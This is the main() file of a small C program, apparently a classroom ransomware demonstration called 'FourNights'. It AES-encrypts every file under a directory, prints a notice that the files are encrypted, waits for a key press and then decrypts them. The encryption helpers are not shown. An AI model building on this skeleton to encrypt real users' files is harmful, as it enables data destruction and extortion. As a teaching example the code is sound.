#include "fournights.h"
/**
  * main - Entry point
  * @argc: argument count
  * @argv: argument vectors
  * Return: 0
  * TODO: need to eliminate hard coded strings.
 **/
int main(int argc, char *argv[])
{
	struct file_filter_s file_filter;
	EVP_CIPHER_CTX encrypt;
	EVP_CIPHER_CTX decrypt;

	file_filter.cipher_flag = 'e'; /* set cipher_flag to encrypt */
	if (argc == 1)
		init_struct(&file_filter, "/home/vagrant/FourNights/TESTS/");
	else
		init_struct(&file_filter, argv[1]); /* Security Hole, I think */
	file_filter.cipher = aes_encrypt_init(&encrypt);
	traverse_dir((char *)file_filter.root_path, &file_filter);
	EVP_CIPHER_CTX_cleanup(file_filter.cipher);
	printf("Your Files are now encrypted.");
	printf("Please enter the password (press enter)\n");
	getchar();
	/* DECRYPT */
	printf("\nWay to go! Here are your files back\n");
	file_filter.cipher_flag = 'd';
	file_filter.cipher = aes_decrypt_init(&decrypt);
	if (!file_filter.cipher)
		printf("Could not decrypt your data, sorry.\n");
	/* reset file extension tokens */
	my_strncat(file_filter.file_exts_whole_str, ".betty\0", 0, 7);
	file_filter.file_extensions[1] = NULL;
	traverse_dir((char *)file_filter.root_path, &file_filter);
	EVP_CIPHER_CTX_cleanup(file_filter.cipher);
	free_file_filter_struct(&file_filter);
	return (EXIT_SUCCESS);
}
